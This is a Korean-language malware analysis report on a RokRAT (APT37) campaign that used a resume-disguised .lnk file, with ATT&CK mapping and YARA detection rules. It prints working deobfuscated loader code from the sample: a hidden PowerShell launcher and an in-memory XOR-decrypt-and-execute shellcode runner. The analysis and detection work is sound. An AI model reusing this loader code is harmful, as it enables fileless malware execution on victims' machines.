# [Malware Analysis] RokRAT

## Overview
1. [Information](#1-information)
2. [Procedures](#2-procedures)
3. [Analysis](#3-analysis)
4. [MITRE ATT&CK Metrics](#4-mitre-attck-metrics)
5. [YARA](#4-yara)
6. [Reference](#6-reference)

sample
sha256 : 707e8cb56f32209ca837f2853801256cd3490ed2cc4b3428dc5e4238848f226d

## 1. Information

한국해양수산연수원 오션폴리텍을 대상으로 한 APT 공격이 발생했다. 공격자는 사회공학적 기법을 사용해 이력서로 위장한 악성 PowerShell 스크립트를 .lnk 파일에 숨겨 실행을 유도했다. 이는 RokRat의 공격 방식과 유사한 특징을 보인다. 

북한의 사이버 공격은 지속적으로 이어져 왔으며, 특히 파일리스 기법을 활용하는 RokRat은 2017년 최초 발견된 이후 APT 37 그룹의 주요 공격 도구로 계속 사용되고 있다.

![[그림 1] 이력서.lnk 기본 정보](img/image.png)

[그림 1] 이력서.lnk 기본 정보

## 2. Procedures

스피어 피싱을 이용하여 .lnk 파일을 유포하고 사용자로 하여금 클릭하도록 미끼 문서를 만든다. 탐지를 우회하기 위해 파일리스 방식을 이용하기 때문에 디스크에는 공격의 흔적이 남지 않는다. 메모리 상에서 동작하는 악성코드는 정상적인 pCloud, Yandex 등을 이용하여 통신을 한다. 이렇다보니 탐지하기는 더욱 어려워지고 있다.

이 캠페인에서는 .lnk 파일을 실행하면 숨겨진 PowerShell 스크립트가 동작하고 각각 PDF, bat, dat 파일을 실행한다. 각 파일이 유기적으로 동작하며 최종적으로 caption.dat으로 저장된 파일은 실행파일로 전환되어 실질적인 악성행위를 수행한다.

![[그림 2] 악성코드 동작 순서도](img/image%201.png)

[그림 2] 악성코드 동작 순서도

## 3. Analysis

### 이력서.lnk

난독화된 PowerShell 스크립트를 포함하고 있으며, 링크 파일의 특정 위치에서 바이너리 데이터를 추출하여 3개의 파일을 생성 후 임시 폴더에 저장한다. 이 코드는 `.lnk` 파일을 통해 시스템에 악성 파일(`.pdf`, `.exe`, `.dat`, `.bat`)을 생성 및 실행하는 악성코드로 다음과 같은 동작을 한다.

![[그림 3] 난독화 된 lnk PowerShell 스크립트](img/image%204.png)

[그림 3] 난독화 된 lnk PowerShell 스크립트

![[그림 4] 난독 해제한 PowerShell 코드](img/image%202.png)

[그림 4] 난독 해제한 PowerShell 코드

- `.lnk` 파일을 통해 데이터(페이로드)와 명령어를 은닉
- PDF와 실행 파일을 시스템에 생성 및 실행
- 문자열 데이터와 배치 스크립트를 생성하여 추가적인 악성 동작을 수행
- `.lnk` 파일을 삭제하여 흔적을 숨김
- 생성되는 파일 명
    
    
    | 파일명 | LNK 파일에서 위치 | 주요 동작 |
    | --- | --- | --- |
    | sharke.bat | 0x000FE317 (크기 : 0x00000147) | PowerShell 실행, 숨김 실행(`start /min`), `elephant.dat` 디코딩 및 실행 |
    | elephant.dat | 0x000FDCE1 (크기 : 0x00000636) | XOR 암호화된 페이로드 복호화, 메모리 실행, Win32 API 호출 (`GlobalAlloc`, `CreateThread`) |
    | caption.dat | 0x00024B51 (크기 : 0x000D9190) | RokRAT 파일로 실질적 악성행위 |
    | 이력서.pdf | 0x0000111A (크기 : 0x00023A37) | PowerShell 또는 `cmd.exe` 실행, `sharke.bat` 호출 |
- 작업 경로 확인
    
    ```powershell
    $dirPath = Get-Location
    if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {
      $dirPath = '%temp%'
    }
    ```
    
    - 현재 작업 경로를 확인하여, 보안 경로인 `System32`나 `Program Files`가 포함된 경우 일반적으로 낮은 권한의 사용자 디렉토리인 `%temp%`로 경로를 변경

### sharke.bat

임시 디렉토리(`$env:temp`)에 위치한 `elephant.dat` 파일을 읽어오는 작업을 수행한다. 파일을 바이트 배열로 읽은 후, 이를 UTF-8 형식으로 문자열로 변환하고, 변환된 문자열은 PowerShell 스크립트로 처리되어 실행 가능한 `scriptblock` 객체로 변환된다. `Invoke-Command` 명령을 사용해 이 스크립트를 실행하는데 일련의 과정은 **숨겨진 상태에서** 악성 PowerShell 스크립트를 실행하기 위한 것으로, `elephant.dat`에 포함된 코드가 시스템에서 실행되도록 한다.

```powershell
start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "$stringPath=$env:temp+'\'+'elephant.dat';$stringByte = Get-Content -path $stringPath -encoding byte;$string = [System.Text.Encoding]::UTF8.GetString($stringByte);$scriptBlock = [scriptblock]::Create($string);Invoke-Command $scriptBlock;"
```

- start /min
    - 명령 프롬프트에서 프로그램을 최소화된 상태로 실행하도록 함
    - 여기서는 powershell.exe를 최소화된 창으로 실행함
- -windowstyle hidden
    - PowerShell 창을 숨긴 상태로 실행하도록 지정
    - 사용자는 실행 중인 PowerShell 창을 보지 못하며, 악성코드의 실행을 눈치채기 어렵게 만듦
- [scriptblock]::Create, Invoke-Command
    - 암호화된 명령어를 실행하는 방식은 악성코드에서 자주 사용됨

### elephant.dat

`caption.dat` 파일을 읽고, 해당 파일의 내용을 XOR 암호화 방식으로 복호화한 후, 이를 메모리에 로드하여 실행한다. 먼저, `caption.dat` 파일을 바이트 배열로 읽고, 바이트마다 지정된 값을 XOR 연산을 통해 복호화한다. 복호화된 데이터를 새로운 바이트 배열에 저장한 후, `.NET`의 `GlobalAlloc` 함수를 사용해 메모리 공간을 할당한다.

그 후, `VirtualProtect` 함수를 사용하여 메모리 보호 속성을 설정하고, 복호화된 데이터 바이트를 메모리에 기록한다. `CreateThread` 함수로 새로운 스레드를 생성하여 복호화된 데이터를 실행하고, `WaitForSingleObject`를 사용해 해당 스레드의 실행이 완료될 때까지 대기한다.

메모리에서 악성 코드를 실행하기 위해 설계된 것으로, 디스크에 악성 파일을 남기지 않고 메모리에서 실행되는 파일리스 방식이다.

```powershell
$exePath=$env:temp+'\caption.dat';$exeFile = Get-Content -path $exePath -encoding byte;$len=$exeFile.count;$newExeFile = New-Object Byte[] $len;$xK='d';for($i=0;$i -lt $len;$i++) {$newExeFile[$i] = $exeFile[$i] -bxor $xk[0]}; [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072);$k1123 = [System.Text.Encoding]::UTF8.GetString(34) + 'kernel32.dll' + [System.Text.Encoding]::UTF8.GetString(34);$a90234s = '[DllImport(' + $k1123 + ')]public static extern IntPtr GlobalAlloc(uint b,uint c);';$b = Add-Type -MemberDefinition $a90234s  -Name 'AAA' -PassThru;$d3s9sdf = '[DllImport(' + $k1123 + ')]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';$a90234sb = Add-Type -MemberDefinition $d3s9sdf -Name 'AAB' -PassThru;$b3s9s03sfse = '[DllImport(' + $k1123 + ')]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);';$cake3sd23 = Add-Type -MemberDefinition $b3s9s03sfse  -Name 'BBB' -PassThru;$dtts9s03sd23 = '[DllImport(' + $k1123 + ')]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);';$fried3sd23 = Add-Type -MemberDefinition $dtts9s03sd23 -Name 'DDD' -PassThru;$byteCount = $newExeFile.Length;$buffer = $b::GlobalAlloc(0x0040, $byteCount + 0x100);$old = 0;$a90234sb::VirtualProtect($buffer, $byteCount + 0x100, 0x40, [ref]$old); for($i = 0;$i -lt $byteCount;$i++) { [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, $newExeFile[$i]); };$handle = $cake3sd23::CreateThread(0, 0, $buffer, 0, 0, 0);$fried3sd23::WaitForSingleObject($handle, 500 * 1000);
```

- `elephant.dat` 파일은 실행 가능한 악성 페이로드가 XOR로 암호화된 상태로 저장되어 있음
- PowerShell 스크립트에서 XOR 암호화를 해제하여 실행 가능한 바이너리를 메모리에 로드
- 복호화된 바이너리를 메모리에 로드한 뒤, `GlobalAlloc`, `VirtualProtect`, `CreateThread` , `WaitForSingleObject`의 API를 호출하여 메모리 상에서 실행
    - `GlobalAlloc`: 메모리 할당 함수
    - `VirtualProtect`: 메모리 보호를 변경하는 함수 (주로 페이지 권한을 변경)
    - `CreateThread`: 새로운 스레드를 생성하는 함수 (새로운 스레드에서 코드 실행)
    - `WaitForSingleObject`: 생성된 스레드가 끝날 때까지 대기하는 함수
- HTTPS 통신에 사용할 보안 프로토콜을 설정하기 위해 SecurityProtocol 설정을 TLS 1.2로 변경

### 이력서.pdf

미끼 문서는 한국해양수산연수원 오션폴리텍의 이력서로 악성행위를 하는 동안 피해자의 의심을 사지 않기 위해 생성되는 normal pdf이다. 총 3 페이지로 구성되어 있으며, 북한 사람의 개인정보를 도용한 것으로 보인다. 

![[그림 5] 이력서.pdf  정보](img/image%203.png)

[그림 5] 이력서.pdf  정보

### C&C 서버 통신

yandex와 fcloud를 이용하여 통신하는 것으로 보아 RoKRAT 악성코드와 연관이 있다.

![[그림 6] Yandex를 이용한 C&C 서버 통신 정보](img/image%205.png)

[그림 6] Yandex를 이용한 C&C 서버 통신 정보

RoKRAT은 기본적으로 'System Management BIOS(SMBIOS)' 등을 이용해 사용자 단말 정보를 수집하고, 위협 행위자의 의도와 명령에 따라 추가 악성코드를 설치한다. 이 과정에서 다음과 같은 합법적인 클라우드 플랫폼을 활용한다.

- pCloud
- Yandex
- OneDrive
- DropBox
- GoogleDrive

## 4. MITRE ATT&CK Metrics


| **Tactic** | **Technique** | **Procedure** |
| --- | --- | --- |
| **Execution** | User Execution: Malicious File (T1204.002) | 사회 공학 기법을 이용한 .lnk파일로 사용자의 클릭 유도  |
|  | Command and Scripting Interpreter: PowerShell (T1059.001) | PowerShell을 사용하여 스크립트 및 악성 페이로드 실행 |
| **Privilege Escalation** | Process Injection: Dynamic-link Library Injection (T1055.001) | API를 사용하여 메모리 내에서 악성 코드 실행 |
| **Defense Evasion** | Obfuscated Files or Information: Fileless Storage (T1027.011) | 파일리스 형식으로 난독화된 코드를 사용하고 메모리에서 실행 |
|  | Obfuscated Files or Information: 
LNK Icon Smuggling (T1027.012) | windows 바로가기 파일(.lnk)에 아이콘 위치 필드를 포함한 메타데이터 숨김 |
|  | Indicator Removal: File Deletion (T1070.004) | 악성 파일 삭제하여 탐지 회피 |
|  | Indicator Removal (T1070) | PowerShell 창을 숨겨 탐지 회피 |
| **Collection** | Archive Collected Data (T1560) | TLS 1.2로 암호화된 채널을 통해 데이터 내용 보호 |
| **Command and Control** | Application Layer Protocol: DNS (T1071.004) | HTTPS 프로토콜을 사용하여 C2 서버와의 연결을 TLS 1.2로 암호화 |
| **Exfiltration** | Exfiltration Over C2 Channel (T1041) | C&C 채널을 통해 데이터 유출 |

## 5. YARA

```powershell
rule Detect_sharke_bat
{
    meta:
        description = "Detects sharke.bat file"
        author = "yj"
        date = "2024-12-29"
        
    strings:
        $powershell = "powershell.exe"
        $start_min = "start /min"
        $invoke_command = "Invoke-Command"
        $elephant_dat = "elephant.dat"

    condition:
        $powershell and $start_min and $invoke_command and $elephant_dat
}

rule Detect_lnk_file
{
    meta:
        description = "Detects LNK file that points to malicious PowerShell script"
        author = "yj"
        date = "2024-12-29"
        
    strings:
        $powershell = "powershell.exe"
        $sharke_bat = "sharke.bat"
        $elephant_dat = "elephant.dat"

    condition:
        $powershell and $sharke_bat and $elephant_dat
}

```

## 6. Reference

[https://asec.ahnlab.com/en/65076/](https://asec.ahnlab.com/en/65076/)

[https://www.genians.co.kr/blog/threat_intelligence/rokrat](https://www.genians.co.kr/blog/threat_intelligence/rokrat)
